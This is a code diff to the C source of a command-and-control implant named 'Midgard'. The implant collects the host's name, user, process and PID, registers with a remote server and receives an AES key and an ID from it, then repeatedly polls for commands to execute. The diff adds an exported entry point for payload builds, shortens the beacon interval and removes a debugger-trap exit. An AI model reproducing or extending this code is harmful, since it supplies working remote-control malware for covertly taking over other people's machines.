@@ -6,13 +6,13 @@
 #include <time.h>
 #include "agent_functions/command_header.h"
 #include "agent_functions/function_header.h"
-#include "cjson/cJSON.h"
-#define REFLECT 1
+#include "cJSON.h"
+#define COMPILE_ID "0c00c3e3-a934-416f-9ae1-7c1a5f926f64"
 
 // Constants
 #define QUEUE_DEPTH 2 // Small because I only need it for hostname
 
-unsigned int sleep_int = 10;
+unsigned int sleep_int = 5;
 
 void sanitize_cmd(char *cmd) {
     size_t len = strlen(cmd);
@@ -81,40 +81,16 @@ void command_execute(request_t *req, int sockfd, profile_t *profile, char *comma
         }
         else {
             char msg[256];
-            snprintf(msg, sizeof(msg), "Invalid command or Something went wrong! (%s %s) How did you do this??\n", command, args ? args : "NULL");
+            snprintf(msg, sizeof(msg), "Invalid command or Something went wrong! (%s %s). Is the command compiled into the payload?\n", command, args ? args : "NULL");
             send2serv(req, profile, msg, strlen(msg));
         }
     }
+    return;
 }
 
-
-int main() {
-
-    // Create UUID
-    srand(time(NULL));
-    const char charset[] = "abcdef1234567890";
-    const char y[] = "89ab";
-    int charset_len = strlen(charset);
-    int y_len = strlen(y);
-
-    int uuid_len = 36 + 1;
-    char tmp_uuid[uuid_len + 1];
-    for (int i = 0; i < uuid_len; i++) {
-        if (i == 8 || i == 13 || i == 18 || i == 23) {
-            tmp_uuid[i] = '-';
-        } else if (i == 14) {
-            tmp_uuid[i] = '4';
-        } else if (i == 19) {
-            int uuid_index = rand() % y_len;
-            tmp_uuid[i] = y[uuid_index];
-        } else {
-            int uuid_index = rand() % charset_len;
-            tmp_uuid[i] = charset[uuid_index];
-        }
-        
-    }
-    tmp_uuid[uuid_len] = '\0';
-    char *uuid = base64_encode((const unsigned char *)tmp_uuid, strlen(tmp_uuid));
+// Switch between go() and main()
+__attribute__((visibility("default")))
+int go() {
 
     struct io_uring ring;
     hash_insert(); // Create hash table
@@ -126,8 +102,11 @@ int main() {
 
     char *host = read_file(&ring, "/proc/sys/kernel/hostname"); // Get system hostname
     sanitize_cmd(host);
-    
-    char *tmp_user = get_environ(&ring, (char *)"USER");
+    char *tmp_user = get_environ(&ring, (char *)"USER"); // Read the USER environment variable
+    char *process = read_file(&ring, "/proc/self/comm"); // Get the name of the current process
+    sanitize_cmd(process);
+
+
     io_uring_queue_exit(&ring);
 
     if (tmp_user == NULL) {
@@ -135,35 +114,44 @@ int main() {
     }
     char *user = base64_encode((const unsigned char *)tmp_user, strlen(tmp_user));
     free(tmp_user);
+    char pid_buf[32];
+    int pid_len = snprintf(pid_buf, sizeof(pid_buf), "%d", getpid());
     
     // Profile Config
     profile_t *profile = malloc(sizeof(profile_t));
     profile->hostname = host;
     profile->user = user;
-    profile->uuid = uuid;
     profile->path = "/v3/api/register";  // Register endpoint
     profile->agent = "Midgard";
-    profile->compile_id = strdup("9a6bef79-9048-4141-9156-138177d41452");
-    profile->reg = (int *)1;
-    profile->aes = (int *)1;
+    profile->compile_id = strdup(COMPILE_ID); // Static compile ID
+    profile->reg = 1; // is registration request
+    profile->aes = 1;
+    profile->pid = pid_buf;
+    profile->pid_len = pid_len;
+    profile->process = process;
 
     // First run (no processing)
     request_t *req = calloc(1, sizeof(request_t));
     profile->method = "POST";
     char *http_body = send2serv(req, profile, profile->compile_id, strlen(profile->compile_id));
     cJSON *response_json = cJSON_Parse(http_body);
-    const cJSON *key = cJSON_GetObjectItemCaseSensitive(response_json, "data"); // Get JSON data
-    const cJSON *iv = cJSON_GetObjectItemCaseSensitive(response_json, "param");
-    if (profile->aes == (int *)1) {
-        size_t outlen;
+    const cJSON *uuid = cJSON_GetObjectItemCaseSensitive(response_json, "uuid");
+    
+    size_t outlen;
+    if (profile->aes == 1) {
+        const cJSON *key = cJSON_GetObjectItemCaseSensitive(response_json, "data"); // Get JSON data
+        const cJSON *iv = cJSON_GetObjectItemCaseSensitive(response_json, "param");
         profile->key = (char *)base64_decode(key->valuestring, strlen(key->valuestring), &outlen, 1);
         profile->iv = (char *)base64_decode(iv->valuestring, strlen(iv->valuestring), &outlen, 1);
     }
+    // Makes a copy of the uuid so we can clean cJSON request
+    profile->uuid = (char *)base64_decode(uuid->valuestring, strlen(uuid->valuestring), &outlen, 1);
+
     cJSON_Delete(response_json);
     cleanup_connection(req);
 
     // Prepare profile config for callbacks
-    
+    profile->uuid = base64_encode((const unsigned char *)profile->uuid, strlen(profile->uuid));
     profile->path = "/v3/api/login";
     profile->reg = 0;
 
@@ -172,7 +160,6 @@ int main() {
     explicit_bzero(profile->compile_id, strlen(profile->compile_id));
     free(profile->compile_id);
     profile->compile_id = NULL;
-    explicit_bzero(tmp_uuid, sizeof(tmp_uuid));
 
     free(profile->user);
 
@@ -189,7 +176,7 @@ int main() {
         const cJSON *command = cJSON_GetObjectItemCaseSensitive(response_json, "data"); // Get JSON data
         const cJSON *param = cJSON_GetObjectItemCaseSensitive(response_json, "param");
 
-        if (response_json == NULL) {
+        if (strcmp(command->valuestring, "") == 0) {
             cJSON_Delete(response_json);
             cleanup_connection(req);
             sleep(sleep_int);
@@ -236,24 +223,21 @@ int main() {
         }
     }
     
-    free(uuid);
-    free(profile->key);
-    free(profile->iv);
+    free(profile->uuid);
+    if (profile->aes) {
+        free(profile->key);
+        free(profile->iv);
+    }
     free(host);
     free(profile);
     
-    if (REFLECT == 1) {
-        #if defined(__aarch64__)
-            __asm__ volatile("brk #0");
-        #elif defined(__x86_64__)
-            __asm__ volatile("int3");
-        #else
-            _exit(0);
-        #endif
-
-        while(1); // Fail safe
-    } else {
-        _exit(0);
-    }
+    _exit(0);
     
 }
+
+#ifndef PAYLOAD_BUILD
+int main(int argc, char **argv) {
+
+    return go();
+}
+#endif
